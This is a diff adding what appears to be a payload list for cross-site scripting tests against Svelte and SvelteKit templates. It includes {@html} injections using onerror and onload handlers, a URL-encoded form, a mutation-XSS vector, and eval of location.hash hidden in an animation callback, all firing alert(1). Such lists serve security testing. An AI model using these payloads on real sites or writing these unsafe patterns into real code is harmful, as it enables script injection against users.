@@ -1,0 +1,46 @@
+{@html '<img src=x onerror=alert(1)>'}
+{@html userInput}
+{@html `<script>alert(1)</script>`}
+{@html dangerouslySetInnerHTML}
+<svelte:component this={constructor.constructor('alert(1)')()}></svelte:component>
+{#if true}{@html '<img src=x onerror=alert(1)>'}{/if}
+{@html '<svg onload=alert(1)>'}
+{@html '<iframe srcdoc="<script>parent.alert(1)</script>">'}
+{@html payload}
+<slot>{@html '<img src=x onerror=alert(1)>'}</slot>
+{#each items as item}{@html item}{/each}
+{@html '<body onload=alert(1)>'}
+{@html '<details open ontoggle=alert(1)>'}
+{@html '<video src=x onerror=alert(1)>'}
+{@html '<audio src=x onerror=alert(1)>'}
+{@html '<object data=javascript:alert(1)>'}
+{@html '<embed src=javascript:alert(1)>'}
+{@html xss_payload}
+{@html interpolated_{var}}
+# URL-encoded Svelte HTML injection
+%7b%40html+%27%3cimg+src%3dx+onerror%3dalert(1)%3e%27%7d
+# Svelte reactive declaration abuse
+$: dangerousHTML = `<img src=x onerror=alert(1)>`
+# Svelte event directive with user input
+<div on:click={eval(userInput)}>click</div>
+# Svelte bind:innerHTML
+<div bind:innerHTML={userInput}></div>
+# Svelte action injection
+<div use:action={userInput}></div>
+# SvelteKit load function injection
+{@html data.html}
+{@html $page.url.searchParams.get('q')}
+# Svelte store injection
+{@html $userStore.profile}
+{@html $settingsStore.template}
+# Component slot injection
+{@html '<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>'}
+# Svelte animation callback
+<div in:fly={{y:-200,duration:500,easing:function(t){eval(location.hash.slice(1));return t}}}></div>
+# Svelte transition injection
+<div transition:fade={{delay:0,duration:300,easing:function(t){alert(1);return t}}}></div>
+# Svelte snippet (Svelte 5)
+{@html snippet_content}
+# Svelte runes (Svelte 5)
+let html = $derived(userInput);
+{@html html}
